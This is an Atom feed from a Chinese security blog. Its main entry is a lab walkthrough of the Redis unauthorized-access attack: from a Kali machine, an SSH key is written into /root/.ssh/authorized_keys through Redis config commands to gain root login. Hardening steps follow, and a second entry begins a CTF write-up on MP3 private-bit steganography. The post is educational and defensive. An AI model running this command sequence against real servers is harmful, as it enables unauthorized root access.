<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kiyomijin.github.io</id>
    <title>My Violet Eva Garden</title>
    <link href="https://kiyomijin.github.io" />
    <updated>2022-09-26T16:02:13.000Z</updated>
    <category term="原创" />
    <category term="数据库安全" />
    <category term="CTF小训" />
    <category term="Misc" />
    <entry>
        <id>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</id>
        <title>Redis提权攻击</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/"/>
        <content type="html">&lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI &lt;a href=&#34;https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80&#34;&gt;C 语言&lt;/a&gt;编写、支持网络、可基于内存亦可持久化的日志型、Key-Value&lt;a href=&#34;https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728&#34;&gt; 数据库&lt;/a&gt;，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由&lt;a href=&#34;https://baike.baidu.com/item/Pivotal&#34;&gt; Pivotal&lt;/a&gt; 赞助。&lt;/p&gt;
&lt;h2 id=&#34;0x00-redis提权攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x00-redis提权攻击&#34;&gt;#&lt;/a&gt; 0x00 Redis 提权攻击&lt;/h2&gt;
&lt;p&gt;​	&lt;strong&gt;Redis&lt;/strong&gt; 在默认情况下，会绑定在 0.0.0.0:&lt;strong&gt;6379&lt;/strong&gt; 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 &lt;code&gt;暴露到公网&lt;/code&gt; 上。&lt;/p&gt;
&lt;p&gt;​	如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。&lt;/p&gt;
&lt;p&gt;​	攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 &lt;code&gt;/root/.ssh&lt;/code&gt;  文件夹的 &lt;code&gt;authotrized_keys&lt;/code&gt;  文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;目标靶机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Ubuntu18.04&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.143&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;攻击主机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Kali2022&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.145&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果没有攻击机没有安装 ssh 则：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install openssh-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启动ssh服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ssh start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-被攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-被攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x01 被攻击机部分准备工作&lt;/h2&gt;
&lt;p&gt;在 Ubuntu 安装 redis 服务器&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install redis-server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212305161.png&#34; alt=&#34;image-20220926212305161&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改 /etc/redis/redis.conf，总共有三点：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212807655.png&#34; alt=&#34;image-20220926212807655&#34;&gt;&lt;/p&gt;
&lt;p&gt;①去除 bind&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213107025.png&#34; alt=&#34;image-20220926213107025&#34;&gt;&lt;/p&gt;
&lt;p&gt;②daemonize yes&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213521318.png&#34; alt=&#34;image-20220926213521318&#34;&gt;&lt;/p&gt;
&lt;p&gt;③protected-mode no&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232253189.png&#34; alt=&#34;image-20220926232253189&#34;&gt;&lt;/p&gt;
&lt;p&gt;重启服务&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service redis stop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;以root身份启动redis服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo redis-server /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试在服务器上自己连一下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(显示127.0.0.1:6379则OK)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232522408.png&#34; alt=&#34;image-20220926232522408&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x02-攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x02 攻击机部分准备工作&lt;/h2&gt;
&lt;p&gt;在攻击机上生成 rsa 秘钥&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214148985.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;重定向到 key.txt&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/kali/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; key.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214549834.png&#34; alt=&#34;image-20220926214549834&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214811675.png&#34; alt=&#34;image-20220926214811675&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后，我们在攻击机（也就是我的 kali）上安装 redis-cli&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxf redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进入到 redis-stable 目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd redis-stable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;拷贝&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp ./src/redis-cli /usr/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220032721.png&#34; alt=&#34;image-20220926220032721&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现如下字样就说明安装成功：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220238790.png&#34; alt=&#34;image-20220926220238790&#34;&gt;&lt;/p&gt;
&lt;p&gt;将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220116946.png&#34; alt=&#34;image-20220926220116946&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-开始攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-开始攻击&#34;&gt;#&lt;/a&gt; 0x03 开始攻击&lt;/h2&gt;
&lt;p&gt;拿到 redis 的 shell 后基本操作：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;info  #查看redis的信息和服务器信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flushall 删除全部数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del key  删除键为key的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get key  得到参数key的数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926234426901.png&#34; alt=&#34;image-20220926234426901&#34;&gt;&lt;/p&gt;
&lt;p&gt;在我们的攻击机 (kali) 上运行如下代码：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;看到回显了OK以后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h 192.168.138.143进入shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926222112479.png&#34; alt=&#34;image-20220926222112479&#34;&gt;&lt;/p&gt;
&lt;p&gt;将目录切换到 /root/.ssh&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926231146929.png&#34; alt=&#34;image-20220926231146929&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232746706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后，回到生成秘钥的终端：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用ssh命令 以root用户的身份 连接“被攻击机”的ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.138.143&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232832651.png&#34; alt=&#34;image-20220926232832651&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，redis 提权攻击完成。&lt;/p&gt;
&lt;h2 id=&#34;0x04-修复建议安全加固&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-修复建议安全加固&#34;&gt;#&lt;/a&gt; 0x04 修复建议 / 安全加固&lt;/h2&gt;
&lt;h3 id=&#34;1禁止一些高危命令重启redis才能生效&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1禁止一些高危命令重启redis才能生效&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 禁止一些高危命令&lt;/strong&gt; (重启 redis 才能生效)&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者另起名字&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name2&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来禁用远程修改 DB 文件地址&lt;/p&gt;
&lt;h3 id=&#34;2以低权限运行-redis-服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2以低权限运行-redis-服务&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 以低权限运行 Redis 服务&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;groupadd -r redis &amp;amp;&amp;amp; useradd -r -g redis redis&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3为-redis-添加密码验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3为-redis-添加密码验证&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3. 为 Redis 添加密码验证&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;requirepass&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;mypassword&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4禁止外网访问-redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4禁止外网访问-redis&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4. 禁止外网访问 Redis&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;bind&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;::1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。&lt;/p&gt;
&lt;h3 id=&#34;5保证-authorized_keys-文件的安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5保证-authorized_keys-文件的安全&#34;&gt;#&lt;/a&gt; &lt;strong&gt;5. 保证 authorized_keys 文件的安全&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;为了保证安全，您应该阻止其他用户添加新的公钥。&lt;/p&gt;
&lt;p&gt;将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 400 ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;注意:&lt;/strong&gt; 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。&lt;/p&gt;
&lt;h3 id=&#34;6修改默认端口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6修改默认端口&#34;&gt;#&lt;/a&gt; &lt;strong&gt;6. 修改默认端口&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件， 找到并修改原来的 &lt;code&gt;port 6379&lt;/code&gt;  ，比如改成 &lt;code&gt;port 17033&lt;/code&gt; ，让人摸不着头脑。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;port 17033 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="数据库安全" />
        <updated>2022-09-26T16:02:13.000Z</updated>
    </entry>
    <entry>
        <id>https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/</id>
        <title>Misc——私有bit隐写</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/"/>
        <content type="html">&lt;h2 id=&#34;0x01-知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-知识点&#34;&gt;#&lt;/a&gt; &lt;strong&gt;0x01 知识点&lt;/strong&gt;&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;typedef FrameHeader&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;// 类型     字段名:bit数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int sync:12;                        //同步信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int version:2;                      //版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int layer: 2;                       //层&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int error protection:1;             //CRC校验&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int bitrate_index:4;                //位率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int sampling_frequency:2;           //采样频率&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int padding:1;                      //帧长调节&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int private:1;                      //保留字 【通常藏有flag】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int mode:2;                         //声道模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int mode extension:2;        		 //扩充模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int copyright:1;                    //版权   【通常藏有flag】&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int original:1;                     //原版标志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsigned int emphasis:2;                     //强调模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;帧长度是压缩时每一帧的长度， &lt;code&gt;包括帧头&lt;/code&gt; 的 4 个字节（32bit）。它将填充的空位也计算在内。&lt;/li&gt;
&lt;li&gt;padding 的值会影响每一帧的长度（具体分析见下面的题目），因为只有 1 位，因此长度也只限于在 0 和 1 之间变化&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x02-题目分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-题目分析&#34;&gt;#&lt;/a&gt; 0x02 题目分析&lt;/h2&gt;
